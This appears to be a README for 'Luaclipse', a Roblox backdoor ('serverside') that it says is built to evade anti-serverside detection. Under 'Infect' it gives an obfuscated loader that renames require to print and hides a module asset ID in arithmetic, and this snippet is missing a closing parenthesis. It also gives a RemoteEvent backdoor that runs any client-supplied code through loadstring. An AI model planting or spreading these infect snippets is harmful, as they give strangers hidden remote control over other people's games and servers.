# 🌙 Luaclipse
Chat-based ROBLOX serverside, chat-based since it won't get detected by anti-serversides.
No you're not getting this serverside, unless you're cool and not a skid,

This is also an FE script for executors which is basically just a backdoor scanner.
So that's why theres a folder called "script_scanner"

# Infect:
```lua
pcall(function()
  local print, math = require, { huge = 784431743.896819 * 99999 }
  print(math.huge)
end
```

Or heres the infect for the backdoor scanner.

YOU HAVE TO TURN ON ``LoadstringEnabled`` IN ServerScriptService!!!

NOTE: YOU CAN ONLY USE THIS IN STUDIO, NOT WITH ACTUAL EXECUTORS
```lua
local remote = Instance.new("RemoteEvent",game:GetService("ReplicatedStorage"))
remote.Name = "Fire_C-Side_Code"
remote.OnServerEvent:Connect(function(player,code)
	loadstring(code)()
	--warn(player.Name.." fired "..remote.Name.." with code: "..tostring(code))
end)
```
### Last updated: 10/1/25
